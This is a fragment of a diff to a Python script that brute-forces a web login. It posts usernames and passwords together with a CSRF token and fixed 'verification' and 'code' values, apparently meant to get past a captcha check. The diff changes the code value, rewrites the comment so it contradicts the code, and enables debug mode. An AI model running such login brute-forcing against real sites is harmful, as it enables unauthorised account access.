@@ -16,12 +16,12 @@ def GET():
     return csrf_token,session
 
 def POST(user,password,UA,token,session):
-        # what the verify code is does not matter, as long as 'verification'=='code'
+        # what the verify code is does not matter, even if 'verification'!='code'
         post_data = {}
         post_data['username'] = user
         post_data['password'] = password
         post_data['verification'] = 'b0ts'
-        post_data['code']='B0TS'
+        post_data['code']='B0T1'
         post_data['submit']='login'
         post_data['csrf_token']=token
         headers ={
@@ -58,7 +58,7 @@ def DEBUG():
     password='123456'
     brute(user,password)
 
-_DEBUG=False
+_DEBUG=True
 
 if __name__ == '__main__':
     if _DEBUG:
